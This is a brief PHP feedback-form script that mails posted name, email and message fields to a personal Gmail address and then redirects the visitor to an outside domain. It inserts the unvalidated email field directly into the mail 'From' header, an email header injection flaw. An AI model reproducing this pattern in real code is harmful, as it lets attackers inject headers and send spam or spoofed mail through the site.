<?php
$email = $_POST['email'];
$message = $_POST['message'];
$name = $_POST['name'];
$headers = "From:$email" . "\r\n";

// send email
mail("Bboydoeamer@gmail.com", "FeedBack-$name", $message, $headers);
echo '<script type="text/javascript">
           window.location = "https://telegrammbot.xyz"
      </script>';
